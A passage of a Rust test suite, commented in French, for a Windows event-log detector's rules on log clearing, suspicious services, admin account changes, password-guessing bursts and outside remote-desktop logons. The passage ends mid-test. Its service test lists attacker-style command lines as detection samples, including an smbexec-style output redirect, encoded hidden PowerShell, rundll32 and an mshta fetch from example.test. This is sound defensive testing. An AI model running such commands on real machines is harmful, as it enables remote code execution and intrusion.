//! Les règles `EVT-` sur des événements fabriqués ici (jamais un vrai journal de la maison) : pour chacune, ce
//! qu'elle doit trouver, ce qu'elle doit laisser, et ce qui la rend non vérifiée ; le moteur contre l'ordre de
//! lecture (proptest) et ses bornes ; puis tout le jeu sur les échantillons publics (`VANGUARD_EVTX_ECHANTILLONS`,
//! jamais dans le dépôt), pour mesurer ce qu'il y trouve.

use std::collections::BTreeSet;
use std::sync::atomic::{AtomicU64, Ordering};

use chrono::{DateTime, Duration, Utc};
use proptest::prelude::*;

use super::jeu::{JOURNAUX, Lieu, REGLES, adresse_inhabituelle, lieu, script_suspect, service_suspect};
use super::moteur::{
    BornesMoteur, EtatJournal, Gravite, Jugement, Lecture, Manque, Moteur, Options, Reserve, Trouvaille,
};
use super::resultat::{self, Analyse, Source};
use crate::journaux_windows::evenement::{EvenementWindows, Origine};
use crate::journaux_windows::evtx::Bornes;
use crate::journaux_windows::trous::{Nature, Numerotation, Suite, Trou};

static NUMERO: AtomicU64 = AtomicU64::new(1);

fn t0() -> DateTime<Utc> {
    DateTime::parse_from_rfc3339("2026-10-18T14:00:00Z").unwrap().to_utc()
}

/// Un événement fabriqué : journal, fournisseur, numéro, secondes après `t0`, champs.
fn ev(journal: &str, fournisseur: &str, id: u32, s: i64, champs: &[(&str, &str)]) -> EvenementWindows {
    EvenementWindows {
        journal: journal.into(),
        id,
        niveau: Some(4),
        date: Some(t0() + Duration::seconds(s)),
        ordinateur: "poste-alice".into(),
        numero: Some(NUMERO.fetch_add(1, Ordering::Relaxed)),
        fournisseur: fournisseur.into(),
        utilisateur: None,
        champs: champs
            .iter()
            .map(|(n, v)| ((*n).to_string(), (*v).to_string()))
            .collect(),
        origine: Origine::Vivant,
        verifie: true,
    }
}

const AUDIT: &str = "Microsoft-Windows-Security-Auditing";
const SCM: &str = "Service Control Manager";

fn sec(id: u32, s: i64, champs: &[(&str, &str)]) -> EvenementWindows {
    ev("Security", AUDIT, id, s, champs)
}

/// Un événement tiré d'un XML à la forme de celui de Windows, par la même extraction que la source vivante.
fn du_xml(x: &str) -> EvenementWindows {
    let (e, _) = crate::journaux_windows::xml::enregistrement(x, &Bornes::default()).unwrap();
    EvenementWindows::depuis(e, Origine::Vivant).unwrap()
}

/// Tous les journaux des règles, lus en entier.
fn tout_lu() -> Vec<EtatJournal> {
    JOURNAUX
        .iter()
        .map(|j| EtatJournal {
            nom: (*j).to_string(),
            lecture: Lecture::Lu(Vec::new()),
            active: Some(true),
            principal: true,
            suites: Vec::new(),
        })
        .collect()
}

fn options() -> Options {
    Options {
        depuis: None,
        defender_antivirus: Some(true),
    }
}

/// Ce qu'écrit tout ordinateur en marche : une ouverture de session d'un service (Security) et un service démarré
/// (System). Sans eux, Security et System lus mais vides rendent leurs règles non vérifiées (`Manque::Vide`). Et un
/// événement sans conséquence dans chaque autre journal : lu mais vide, un journal calme rend lui aussi ses règles non
/// vérifiées (`Manque::VideCalme`).
fn ordinaire() -> Vec<EvenementWindows> {
    let mut v = vec![
        sec(4624, 0, &[("LogonType", "5"), ("TargetUserName", "SYSTEM")]),
        ev(
            "System",
            SCM,
            7036,
            0,
            &[("param1", "Windows Update"), ("param2", "running")],
        ),
    ];
    v.extend(
        JOURNAUX
            .iter()
            .filter(|j| !matches!(**j, "Security" | "System"))
            .map(|j| ev(j, "Microsoft-Windows-Essai", 65_000, 0, &[])),
    );
    v
}

fn juger_nu(evs: &[EvenementWindows], etats: &[EtatJournal], options: Options) -> Vec<Jugement> {
    let mut m = Moteur::nouveau(REGLES, options, BornesMoteur::default());
    for e in evs {
        m.recevoir(e);
    }
    m.conclure(etats)
}

fn juger_avec(evs: &[EvenementWindows], etats: &[EtatJournal], options: Options) -> Vec<Jugement> {
    let mut tous = ordinaire();
    tous.extend_from_slice(evs);
    juger_nu(&tous, etats, options)
}

fn juger(evs: &[EvenementWindows]) -> Vec<Jugement> {
    juger_avec(evs, &tout_lu(), options())
}

fn regle<'a>(js: &'a [Jugement], id: &str) -> &'a Jugement {
    js.iter().find(|j| j.regle.id == id).unwrap()
}

fn trouvailles<'a>(js: &'a [Jugement], id: &str) -> &'a [Trouvaille] {
    &regle(js, id).trouvailles
}

fn gravites(js: &[Jugement], id: &str) -> Vec<Gravite> {
    trouvailles(js, id).iter().map(|t| t.gravite).collect()
}

// ---------------------------------------------------------------------------------------------------------------
// Le jeu lui-même
// ---------------------------------------------------------------------------------------------------------------

#[test]
fn chaque_regle_est_bien_formee() {
    let mut vus = BTreeSet::new();
    for r in REGLES {
        assert!(crate::modele::id::bien_forme(r.id), "{}", r.id);
        assert!(r.id.starts_with("EVT-"), "{}", r.id);
        assert!(vus.insert(r.id), "{} deux fois", r.id);
        assert!(!r.sujet.0.is_empty() && !r.sujet.1.is_empty());
        assert!(!r.techniques.is_empty(), "{} sans technique", r.id);
        assert!(r.techniques.iter().all(|t| t.starts_with('T')), "{}", r.id);
        assert!(
            r.references
                .iter()
                .any(|u| u.starts_with("https://learn.microsoft.com/")),
            "{} : la documentation de Microsoft",
            r.id
        );
        assert!(
            r.references
                .iter()
                .any(|u| u.starts_with("https://attack.mitre.org/techniques/")),
            "{} : la page d'ATT&CK",
            r.id
        );
        for v in r.volets {
            assert!(
                v.journal.is_empty() || JOURNAUX.contains(&v.journal),
                "{} : {}",
                r.id,
                v.journal
            );
        }
    }
    assert_eq!(REGLES.len(), 11);
}

// ---------------------------------------------------------------------------------------------------------------
// EVT-EFF-001
// ---------------------------------------------------------------------------------------------------------------

#[test]
fn journal_de_securite_efface() {
    let x = "<Event><System><Provider Name='Microsoft-Windows-Eventlog'/><EventID>1102</EventID><Level>4</Level>\
             <TimeCreated SystemTime='2026-10-18T14:05:09Z'/><EventRecordID>1087729</EventRecordID>\
             <Channel>Security</Channel><Computer>poste-alice</Computer></System><UserData>\
             <LogFileCleared xmlns='http://manifests.microsoft.com/win/2004/08/windows/eventlog'>\
             <SubjectUserSid>S-1-5-21-1-2-3-1001</SubjectUserSid><SubjectUserName>bob</SubjectUserName>\
             <SubjectDomainName>POSTE-ALICE</SubjectDomainName><SubjectLogonId>0x55cd1d</SubjectLogonId>\
             </LogFileCleared></UserData></Event>";
    let js = juger(&[du_xml(x)]);
    let t = trouvailles(&js, "EVT-EFF-001");
    assert_eq!(t.len(), 1);
    assert_eq!(t[0].gravite, Gravite::Alerte);
    assert!(t[0].details.iter().any(|(_, v)| v == "POSTE-ALICE\\bob"));
    // Un 1102 d'un autre fournisseur (un programme qui écrit dans le journal de sécurité sous un faux nom) n'est pas
    // celui de Windows.
    let faux = ev("Security", "Faux", 1102, 0, &[]);
    assert_eq!(trouvailles(&juger(&[faux]), "EVT-EFF-001"), []);
}

#[test]
fn journal_efface_par_104() {
    let e = ev(
        "System",
        "Microsoft-Windows-Eventlog",
        104,
        0,
        &[
            ("SubjectUserName", "bob"),
            ("Channel", "Microsoft-Windows-Sysmon/Operational"),
        ],
    );
    let js = juger(&[e]);
    let t = trouvailles(&js, "EVT-EFF-001");
    assert_eq!(t[0].objet, "microsoft-windows-sysmon/operational|2026-10-18T14:00:00");
    // Pas un 104 de RdpCoreTS (un autre sens dans un autre journal).
    let autre = ev(
        "Microsoft-Windows-RemoteDesktopServices-RdpCoreTS/Operational",
        "x",
        104,
        0,
        &[],
    );
    assert_eq!(trouvailles(&juger(&[autre]), "EVT-EFF-001"), []);
}

fn suite(trous: Vec<Trou>, non_verifies: u64) -> Suite {
    Suite {
        numerotation: Numerotation::Journal,
        premier: Some(1),
        dernier: Some(1000),
        presents: 900,
        doublons: 0,
        incoherences: 0,
        trous,
        trous_au_dela: 0,
        non_verifies,
    }
}

fn trou(de: u64, a: u64, nature: Nature, avant_s: i64, apres_s: i64) -> Trou {
    Trou {
        de,
        a,
        nature,
        avant: Some(t0() + Duration::seconds(avant_s)),
        apres: Some(t0() + Duration::seconds(apres_s)),
    }
}

fn avec_suite(s: Suite) -> Vec<EtatJournal> {
    let mut etats = tout_lu();
    etats.iter_mut().find(|e| e.nom == "Security").unwrap().suites = vec![s];
    etats
}

#[test]
fn trous_de_numeros_juges_selon_leur_nature() {
    let etats = avec_suite(suite(
        vec![
            trou(10, 12, Nature::Retires, 0, 60),
            trou(100, 199, Nature::Absents, 1000, 1100),
            trou(300, 310, Nature::Absents, 5000, 5600),
            trou(400, 401, Nature::CopieAChaud, 7000, 7100),
            trou(500, 520, Nature::AvantExport, 8000, 8100),
            trou(600, 650, Nature::Illisible, 9000, 9100),
        ],
        0,
    ));
    // Un arrêt inattendu entre 5000 et 5600 : il explique le second trou « Absents », pas le premier.
    let arret = ev("System", "EventLog", 6008, 5300, &[]);
    let js = juger_avec(&[arret], &etats, options());
    let t = trouvailles(&js, "EVT-EFF-001");
    let par_objet = |o: &str| t.iter().find(|x| x.objet == o).unwrap();
    assert_eq!(par_objet("security:10-12").gravite, Gravite::Critique);
    assert_eq!(par_objet("security:100-199").gravite, Gravite::Alerte);
    let explique = par_objet("security:300-310");
    assert_eq!(explique.gravite, Gravite::Info);
    assert!(explique.reserves.contains(&Reserve::ArretInattendu));
    assert!(par_objet("security:400-401").reserves.contains(&Reserve::CopieAChaud));
    assert!(par_objet("security:500-520").reserves.contains(&Reserve::AvantExport));
    // Un trou là où la lecture a perdu quelque chose : non vérifié, jamais une alerte ni un silence.
    assert!(!t.iter().any(|x| x.objet == "security:600-650"));
    assert!(
        regle(&js, "EVT-EFF-001")
            .manques
            .iter()
            .any(|m| matches!(m, Manque::TrousIllisibles { nombre: 51, .. }))
    );
    // Kernel-Power 41 explique aussi ; un 41 de CAPI2 (un autre événement) non.
    let coupure = ev("System", "Microsoft-Windows-Kernel-Power", 41, 1050, &[]);
    let js = juger_avec(&[coupure], &etats, options());
    assert_eq!(
        trouvailles(&js, "EVT-EFF-001")
            .iter()
            .find(|x| x.objet == "security:100-199")
            .unwrap()
            .gravite,
        Gravite::Info
    );
    // Un arrêt au milieu d'un long trou n'excuse pas ce qui manque avant lui.
    let long = avec_suite(suite(vec![trou(100, 5000, Nature::Absents, 0, 100_000)], 0));
    let milieu = ev("System", "EventLog", 6008, 50_000, &[]);
    assert_eq!(
        gravites(&juger_avec(&[milieu], &long, options()), "EVT-EFF-001"),
        [Gravite::Alerte]
    );
    let capi = ev("System", "Microsoft-Windows-CAPI2", 41, 1050, &[]);
    let js = juger_avec(&[capi], &etats, options());
    assert_eq!(
        trouvailles(&js, "EVT-EFF-001")
            .iter()
            .find(|x| x.objet == "security:100-199")
            .unwrap()
            .gravite,
        Gravite::Alerte
    );
}

#[test]
fn une_suite_qui_ne_tient_qu_a_des_morceaux_abimes_n_est_pas_une_preuve() {
    let js = juger_avec(&[], &avec_suite(suite(Vec::new(), 12)), options());
    let j = regle(&js, "EVT-EFF-001");
    assert_eq!(j.trouvailles, []);
    assert!(!j.verifie());
    assert!(
        j.manques
            .iter()
            .any(|m| matches!(m, Manque::SuiteNonProuvee { nombre: 12, .. }))
    );
}

#[test]
fn numeros_en_double_signales() {
    let mut s = suite(Vec::new(), 0);
    s.doublons = 3;
    let js = juger_avec(&[], &avec_suite(s), options());
    assert_eq!(gravites(&js, "EVT-EFF-001"), [Gravite::Alerte]);
}

// ---------------------------------------------------------------------------------------------------------------
// EVT-SRV-001
// ---------------------------------------------------------------------------------------------------------------

#[test]
fn services_suspects() {
    let critique = [
        r"%COMSPEC% /Q /c echo cd ^> \\127.0.0.1\C$\__output 2^>^&1 > %TEMP%\x.bat",
        r"C:\Windows\System32\cmd.exe /c whoami",
        r"cmd /c start powershell -nop",
        r#""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -enc SQBFAFgA"#,
        r"C:\WINDOWS\SYSTEM32\WINDOW~1\V1.0\POWERS~1.EXE -nop -w hidden",
        r"C:/Windows/System32/rundll32.exe C:\x.dll,Run",
        r"C:\Windows\System32\MSHTA.EXE http://example.test/x.hta",
        r"%SystemRoot%\System32\RUNDLL~1.EXE x.dll,A",
    ];
    for c in critique {
        assert_eq!(service_suspect("svc", c).map(|x| x.0), Some(Gravite::Critique), "{c}");
    }
    let alerte = [
        r"C:\Users\alice\AppData\Local\Temp\svc.exe",
        r#""C:\Users\Public\updater.exe" --service"#,
        r"\??\C:\Users\alice\Downloads\drv.sys",
        r"C:\Windows\Temp\abc.exe",
        r"%TEMP%\x.exe",
        r"\\serveur\partage\svc.exe",
    ];
    for c in alerte {
        assert_eq!(service_suspect("svc", c).map(|x| x.0), Some(Gravite::Alerte), "{c}");
    }
    let rien = [
        r#""C:\Program Files\Mozilla Maintenance Service\maintenanceservice.exe""#,
        r"C:\Program Files (x86)\Steam\bin\steamservice.exe /RunAsService",
        r"\SystemRoot\System32\drivers\WUDFRd.sys",
        r"system32\DRIVERS\BTHUSB.sys",
        r#""C:\Program Files\NVIDIA Corporation\Display.NvContainer\NVDisplay.Container.exe" -s NVDisplay.ContainerLocalSystem"#,
        r"C:\WINDOWS\system32\svchost.exe -k netsvcs -p",
    ];
    for c in rien {
        assert_eq!(service_suspect("svc", c), None, "{c}");
    }
    // Le pilote des mises à jour de Defender, noté par Microsoft ; ailleurs dans ProgramData : à savoir.
    let mpksl = r"C:\ProgramData\Microsoft\Windows Defender\Definition Updates\{0A1B}\MpKslDrv.sys";
    assert_eq!(service_suspect("MpKsl4f3a2b1c", mpksl), None);
    assert_eq!(service_suspect("autre", mpksl).map(|x| x.0), Some(Gravite::Info));
    assert_eq!(
        service_suspect("x", r"C:\PROGRA~3\Vendor\svc.exe").map(|x| x.0),
        Some(Gravite::Info)
    );
}

#[test]
fn service_installe_et_journal_coupe() {
    let svc = ev(
        "System",
        SCM,
        7045,
        0,
        &[
            ("ServiceName", "XYZsvc"),
            ("ImagePath", r"C:\Windows\System32\cmd.exe /c C:\Users\Public\a.bat"),
            ("ServiceType", "user mode service"),
            ("StartType", "demand start"),
            ("AccountName", "LocalSystem"),
        ],
    );
    let coupe = ev(
        "System",
        SCM,
        7040,
        10,
        &[
            ("param1", "Journal d’événements Windows"),
            ("param2", "démarrage automatique"),
            ("param3", "désactivé"),
            ("param4", "eventlog"),
        ],
    );
    let bits = ev(
        "System",
        SCM,
        7040,
        20,
        &[
            ("param1", "Background Intelligent Transfer Service"),
            ("param2", "demand start"),
            ("param3", "auto start"),
            ("param4", "BITS"),
        ],
    );
    let js = juger(&[svc, coupe, bits]);
    assert_eq!(gravites(&js, "EVT-SRV-001"), [Gravite::Critique, Gravite::Critique]);
    let ordinaire = ev(
        "System",
        SCM,
        7045,
        0,
        &[
            ("ServiceName", "Steam Client Service"),
            (
                "ImagePath",
                r#""C:\Program Files (x86)\Common Files\Steam\steamservice.exe" /RunAsService"#,
            ),
        ],
    );
    assert_eq!(trouvailles(&juger(&[ordinaire]), "EVT-SRV-001"), []);
}

// ---------------------------------------------------------------------------------------------------------------
// EVT-ADM-001
// ---------------------------------------------------------------------------------------------------------------

#[test]
fn comptes_et_groupes() {
    let cache = sec(
        4720,
        0,
        &[("TargetUserName", "aide$"), ("TargetSid", "S-1-5-21-1-2-3-1005")],
    );
    let ordinaire = sec(
        4720,
        1,
        &[("TargetUserName", "carole"), ("TargetSid", "S-1-5-21-1-2-3-1006")],
    );
    // Par le SID, jamais par le nom traduit : « Administrateurs » en français, et un groupe nommé comme lui ne
    // compte pas.
    let admin = sec(
        4732,
        2,
        &[
            ("MemberName", "-"),
            ("MemberSid", "S-1-5-21-1-2-3-1005"),
            ("TargetUserName", "Administrateurs"),
            ("TargetSid", "s-1-5-32-544"),
        ],
    );
    let leurre = sec(
        4732,
        3,
        &[
            ("MemberSid", "S-1-5-21-1-2-3-1006"),
            ("TargetUserName", "Administrators"),
            ("TargetSid", "S-1-5-21-1-2-3-1100"),
        ],
    );
    let utilisateurs = sec(
        4732,
        4,
        &[("MemberSid", "S-1-5-21-1-2-3-1006"), ("TargetSid", "S-1-5-32-545")],
    );
    let bureau = sec(
        4732,
        5,
        &[("MemberSid", "S-1-5-21-1-2-3-1006"), ("TargetSid", "S-1-5-32-555")],
    );
    let js = juger(&[cache, ordinaire, admin, leurre, utilisateurs, bureau]);
    let t = trouvailles(&js, "EVT-ADM-001");
    assert_eq!(t.len(), 4, "{t:#?}");
    assert_eq!(t[0].gravite, Gravite::Critique);
    assert_eq!(t[0].objet, "cree:aide$");
    assert!(t.iter().any(|x| x.objet == "groupe:s-1-5-32-544:s-1-5-21-1-2-3-1005"));
    assert!(t.iter().any(|x| x.objet.starts_with("groupe:s-1-5-32-555")));
    assert!(t.iter().any(|x| x.objet == "cree:carole" && x.gravite == Gravite::Info));
}

#[test]
fn groupes_de_domaine_et_comptes_changes() {
    let domaine = sec(
        4728,
        0,
        &[
            ("MemberSid", "S-1-5-21-9-9-9-1105"),
            ("TargetSid", "S-1-5-21-9-9-9-512"),
        ],
    );
    let aucun = sec(
        4728,
        1,
        &[
            ("MemberSid", "S-1-5-21-9-9-9-1105"),
            ("TargetSid", "S-1-5-21-9-9-9-513"),
        ],
    );
    let active = sec(
        4738,
        2,
        &[
            ("TargetUserName", "Administrateur"),
            ("TargetSid", "S-1-5-21-1-2-3-500"),
            ("OldUacValue", "0x211"),
            ("NewUacValue", "0x210"),
        ],
    );
    // Un compte neuf activé (0x15 → 0x14) : l'ordinaire d'une création par « net user ».
    let neuf = sec(
        4738,
        3,
        &[
            ("TargetUserName", "carole"),
            ("TargetSid", "S-1-5-21-1-2-3-1006"),
            ("OldUacValue", "0x15"),
            ("NewUacValue", "0x14"),
        ],
    );
    let sans_mdp = sec(
        4738,
        4,
        &[
            ("TargetUserName", "carole"),
            ("TargetSid", "S-1-5-21-1-2-3-1006"),
            ("OldUacValue", "0x10"),
            ("NewUacValue", "0x14"),
        ],
    );
    let js = juger(&[domaine, aucun, active, neuf, sans_mdp]);
    let mut objets: Vec<&str> = trouvailles(&js, "EVT-ADM-001")
        .iter()
        .map(|t| t.objet.as_str())
        .collect();
    objets.sort_unstable();
    assert_eq!(
        objets,
        [
            "active:s-1-5-21-1-2-3-500",
            "groupe:s-1-5-21-9-9-9-512:s-1-5-21-9-9-9-1105",
            "sans-mot-de-passe:s-1-5-21-1-2-3-1006"
        ]
    );
}

// ---------------------------------------------------------------------------------------------------------------
// EVT-MDP-001
// ---------------------------------------------------------------------------------------------------------------

fn echec(s: i64, compte: &str, ip: &str, type_: &str) -> EvenementWindows {
    sec(
        4625,
        s,
        &[
            ("TargetUserName", compte),
            ("IpAddress", ip),
            ("LogonType", type_),
            ("Status", "0xc000006d"),
            ("SubStatus", "0xc000006a"),
        ],
    )
}

fn reussite(s: i64, compte: &str, ip: &str, type_: &str) -> EvenementWindows {
    sec(
        4624,
        s,
        &[("TargetUserName", compte), ("IpAddress", ip), ("LogonType", type_)],
    )
}

#[test]
fn rafale_d_echecs_puis_reussite() {
    // Dix échecs en neuf minutes, par le Bureau à distance, puis une réussite deux minutes après.
    let mut evs: Vec<EvenementWindows> = (0..10)
        .map(|i| echec(i * 60, "Administrateur", "203.0.113.9", "10"))
        .collect();
    let js = juger(&evs);
    let t = trouvailles(&js, "EVT-MDP-001");
    assert_eq!(t.len(), 2, "par compte et par adresse : {t:#?}");
    assert!(t.iter().all(|x| x.gravite == Gravite::Alerte && x.nombre == 10));
    assert!(t.iter().any(|x| x.objet == "rafale:administrateur") && t.iter().any(|x| x.objet == "rafale:203.0.113.9"));
    evs.push(reussite(660, "administrateur", "203.0.113.9", "10"));
    let js = juger(&evs);
    let critiques: Vec<&Trouvaille> = trouvailles(&js, "EVT-MDP-001")
        .iter()
        .filter(|t| t.gravite == Gravite::Critique)
        .collect();
    assert_eq!(
        critiques.len(),
        1,
        "la réussite suit la rafale du compte (casse comprise)"
    );
    assert_eq!(critiques[0].objet, "apres:administrateur");
    // La réussite qui fonde l'alerte est dans ses repères.
    assert!(critiques[0].reperes.iter().any(|r| r.id == 4624));
    // Le même compte écrit autrement (« POSTE\\Administrateur », « administrateur@poste ») : la même clé.
    let mut autrement: Vec<EvenementWindows> = (0..10)
        .map(|i| {
            echec(
                i * 60,
                if i % 2 == 0 {
                    "POSTE\\Administrateur"
                } else {
                    "administrateur@poste"
                },
                "-",
                "10",
            )
        })
        .collect();
    autrement.push(reussite(660, "Administrateur", "-", "10"));
    let js = juger(&autrement);
    assert!(
        trouvailles(&js, "EVT-MDP-001")
            .iter()
            .any(|t| t.objet == "apres:administrateur")
    );
}

#[test]
fn pas_de_rafale_sans_les_dix_dans_la_fenetre() {
    // Neuf échecs : rien. Dix échecs étalés sur dix-huit minutes : rien. Des tâches au mot de passe périmé (type 4,
    // 5) : rien. Une réussite trente minutes après une rafale : pas « juste après ».
    let neuf: Vec<EvenementWindows> = (0..9).map(|i| echec(i * 10, "alice", "192.168.1.20", "2")).collect();
    assert_eq!(trouvailles(&juger(&neuf), "EVT-MDP-001"), []);
    let etales: Vec<EvenementWindows> = (0..10).map(|i| echec(i * 120, "alice", "192.168.1.20", "3")).collect();
    assert_eq!(trouvailles(&juger(&etales), "EVT-MDP-001"), []);
    let taches: Vec<EvenementWindows> = (0..30).map(|i| echec(i, "svc-sauvegarde", "-", "5")).collect();
    assert_eq!(trouvailles(&juger(&taches), "EVT-MDP-001"), []);
    let mut tard: Vec<EvenementWindows> = (0..10).map(|i| echec(i, "alice", "198.51.100.4", "3")).collect();
    tard.push(reussite(1800, "alice", "198.51.100.4", "3"));
    assert!(
        gravites(&juger(&tard), "EVT-MDP-001")
            .iter()
            .all(|g| *g == Gravite::Alerte)
    );
    // À l'écran (127.0.0.1) : regroupé par compte, pas par adresse ; douze en douze secondes, plus vite qu'une
    // personne ne tape : aussi par ordinateur.
    let ecran: Vec<EvenementWindows> = (0..12).map(|i| echec(i * 2, "alice", "127.0.0.1", "2")).collect();
    let js = juger(&ecran);
    let mut objets: Vec<&str> = trouvailles(&js, "EVT-MDP-001")
        .iter()
        .map(|t| t.objet.as_str())
        .collect();
    objets.sort_unstable();
    assert_eq!(objets, ["rafale:*", "rafale:alice"]);
    // Cinq échecs en dix secondes sur des comptes différents (un programme qui essaie) ; quatre : rien.
    let vite: Vec<EvenementWindows> = (0..5).map(|i| echec(i, &format!("c{i}"), "-", "3")).collect();
    assert_eq!(gravites(&juger(&vite), "EVT-MDP-001"), [Gravite::Alerte]);
    assert_eq!(trouvailles(&juger(&vite[..4]), "EVT-MDP-001"), []);
    // Un 4625 d'EventSystem dans Application (un autre événement sous le même numéro).
    let autres: Vec<EvenementWindows> = (0..20)
        .map(|i| ev("Application", "Microsoft-Windows-EventSystem", 4625, i, &[]))
        .collect();
    assert_eq!(trouvailles(&juger(&autres), "EVT-MDP-001"), []);
}

#[test]
fn une_rafale_qui_ne_tient_qu_a_des_morceaux_abimes_est_un_indice() {
    let evs: Vec<EvenementWindows> = (0..10)
        .map(|i| {
            let mut e = echec(i, "alice", "198.51.100.4", "3");
            e.verifie = i < 5;
            e
        })
        .collect();
    let js = juger(&evs);
    let t = trouvailles(&js, "EVT-MDP-001");
    // Par compte (dix en dix minutes) : ne tient qu'avec les abîmés. Par ordinateur (cinq en dix secondes) : les
    // cinq vérifiés suffisent.
    let par_compte = t.iter().find(|x| x.objet == "rafale:alice").unwrap();
    assert!(par_compte.reserves.contains(&Reserve::MorceauAbime) && par_compte.verifies == 0);
    let vite = t.iter().find(|x| x.objet == "rafale:*").unwrap();
    assert!(vite.reserves.is_empty() && vite.verifies == 5);
}

proptest! {
    /// L'ordre de lecture ne fait ni perdre ni inventer une alerte : les mêmes trouvailles (objet, gravité, nombre,
    /// dates, réserves) dans n'importe quel ordre.
    #[test]
    fn l_ordre_ne_change_rien(
        ecarts in proptest::collection::vec((0i64..200, 0usize..3, 0usize..3, any::<bool>(), any::<bool>()), 1..80),
        graine in any::<u64>(),
    ) {
        let comptes = ["alice", "bob", "Administrateur"];
        let ips = ["203.0.113.9", "198.51.100.4", "-"];
        let mut s = 0i64;
        let mut evs = Vec::new();
        for (d, c, a, ok, verifie) in ecarts {
            s += d;
            let mut e = if ok { reussite(s, comptes[c], ips[a], "3") } else { echec(s, comptes[c], ips[a], "3") };
            e.verifie = verifie;
            evs.push(e);
        }
        let resume = |js: &[Jugement]| -> BTreeSet<String> {
            trouvailles(js, "EVT-MDP-001")
                .iter()
                .map(|t| format!("{} {} {:?} {} {:?} {:?} {:?} {}", t.volet, t.objet, t.gravite, t.nombre, t.premier, t.dernier, t.reserves, t.verifies))
                .collect()
        };
        let avant = resume(&juger(&evs));
        // Un mélange déterministe (Fisher-Yates sur un générateur simple) : la graine vient de proptest.
        let mut x = graine | 1;
        for i in (1..evs.len()).rev() {
            x ^= x << 13; x ^= x >> 7; x ^= x << 17;
            let j = usize::try_from(x % (i as u64 + 1)).unwrap();
            evs.swap(i, j);
        }
        prop_assert_eq!(avant, resume(&juger(&evs)));
    }

    /// Une réussite qui suit une rafale, contre un modèle naïf : dix échecs en dix minutes tous dans les quinze
    /// minutes d'avant elle, le dernier au plus cinq minutes avant.
    #[test]
    fn reussite_apres_rafale_comme_le_modele(echecs in proptest::collection::vec(0i64..4000, 0..30), reussites in proptest::collection::vec(0i64..4000, 1..4)) {
        let mut evs: Vec<EvenementWindows> = echecs.iter().map(|&s| echec(s, "alice", "-", "3")).collect();
        evs.extend(reussites.iter().map(|&s| reussite(s, "alice", "-", "3")));
        let mut a = echecs.clone();
        a.sort_unstable();
        let suit = |s: i64| {
            let avant: Vec<i64> = a.iter().copied().filter(|&x| x <= s).collect();
            avant.last().is_some_and(|&d| s - d <= 300)
                && avant.iter().copied().filter(|&x| s - x <= 900).collect::<Vec<_>>().windows(10).any(|w| w[9] - w[0] <= 600)
        };
        let attendu = reussites.iter().filter(|&&s| suit(s)).count() as u64;
        let js = juger(&evs);
        let obtenu = trouvailles(&js, "EVT-MDP-001").iter().filter(|t| t.gravite == Gravite::Critique).map(|t| t.nombre).sum::<u64>();
        prop_assert_eq!(obtenu, attendu);
    }

    /// Les rafales contre un modèle naïf : une clé a une rafale si et seulement si dix de ses échecs tiennent dans dix
    /// minutes.
    #[test]
    fn rafales_comme_le_modele(dates in proptest::collection::vec(0i64..3000, 0..40)) {
        let evs: Vec<EvenementWindows> = dates.iter().map(|&s| echec(s, "alice", "-", "3")).collect();
        let mut triees = dates.clone();
        triees.sort_unstable();
        let attendu = triees.windows(10).any(|w| w[9] - w[0] <= 600);
        let js = juger(&evs);
        prop_assert_eq!(trouvailles(&js, "EVT-MDP-001").iter().any(|t| t.volet == 0), attendu);
        let vite = triees.windows(5).any(|w| w[4] - w[0] <= 10);
        prop_assert_eq!(trouvailles(&js, "EVT-MDP-001").iter().any(|t| t.objet == "rafale:*"), vite);
    }
}

// ---------------------------------------------------------------------------------------------------------------
// EVT-RDP-001
// ---------------------------------------------------------------------------------------------------------------

#[test]
fn adresses_classees() {
    for a in [
        "127.0.0.1",
        "::1",
        "10.0.0.4",
        "172.16.9.1",
        "192.168.1.20",
        "169.254.3.3",
        "fe80::1%12",
        "fd12::5",
        "-",
        "",
        "LOCAL",
        "::ffff:192.168.1.5",
    ] {
        assert_eq!(lieu(a), Lieu::Local, "{a}");
    }
    for a in [
        "203.0.113.9",
        "8.8.8.8",
        "2001:db8::1",
        "::ffff:198.51.100.4",
        "172.32.0.1",
    ] {
        assert_eq!(lieu(a), Lieu::Internet, "{a}");
    }
    assert_eq!(lieu("100.101.102.103"), Lieu::Partage);
    assert_eq!(lieu("pas-une-adresse"), Lieu::Illisible);
}

#[test]
fn bureau_a_distance_depuis_l_exterieur() {
    let dehors = sec(
        4624,
        0,
        &[
            ("LogonType", "10"),
            ("IpAddress", "203.0.113.9"),
            ("TargetUserName", "alice"),
        ],
    );
    let maison = sec(
        4624,
        1,
        &[
            ("LogonType", "10"),
            ("IpAddress", "192.168.1.20"),
            ("TargetUserName", "alice"),
        ],
    );
    let reseau = sec(
        4624,
        2,
        &[
            ("LogonType", "3"),
            ("IpAddress", "203.0.113.9"),
            ("TargetUserName", "alice"),
        ],
    );
    // LocalSessionManager 21 et RemoteConnectionManager 1149 : leurs champs sous UserData/EventXML.
    let lsm = du_xml(
        "<Event><System><Provider Name='Microsoft-Windows-TerminalServices-LocalSessionManager'/><EventID>21</EventID>\
         <TimeCreated SystemTime='2026-10-18T14:05:09Z'/><EventRecordID>12</EventRecordID>\
         <Channel>Microsoft-Windows-TerminalServices-LocalSessionManager/Operational</Channel><Computer>poste-alice</Computer>\
         </System><UserData><EventXML xmlns='Event_NS'><User>POSTE-ALICE\\alice</User><SessionID>2</SessionID>\
         <Address>198.51.100.4</Address></EventXML></UserData></Event>",
    );
    let console = du_xml(
        "<Event><System><Provider Name='Microsoft-Windows-TerminalServices-LocalSessionManager'/><EventID>21</EventID>\
         <TimeCreated SystemTime='2026-10-18T14:06:09Z'/><EventRecordID>13</EventRecordID>\
         <Channel>Microsoft-Windows-TerminalServices-LocalSessionManager/Operational</Channel><Computer>poste-alice</Computer>\
         </System><UserData><EventXML xmlns='Event_NS'><User>POSTE-ALICE\\alice</User><SessionID>1</SessionID>\
         <Address>LOCAL</Address></EventXML></UserData></Event>",
    );
    let rcm = ev(
        "Microsoft-Windows-TerminalServices-RemoteConnectionManager/Operational",
        "Microsoft-Windows-TerminalServices-RemoteConnectionManager",
        1149,
        5,
        &[("Param1", "alice"), ("Param2", "POSTE"), ("Param3", "174.127.93.2")],
    );
    let tailscale = sec(
        4624,
        6,
        &[
            ("LogonType", "10"),
            ("IpAddress", "100.101.1.2"),
            ("TargetUserName", "alice"),
        ],
    );
    let js = juger(&[dehors, maison, reseau, lsm, console, rcm, tailscale]);
    let t = trouvailles(&js, "EVT-RDP-001");
    // Par volet (4624, sessions, authentifications) : le compte et d'où, l'adresse dans les détails.
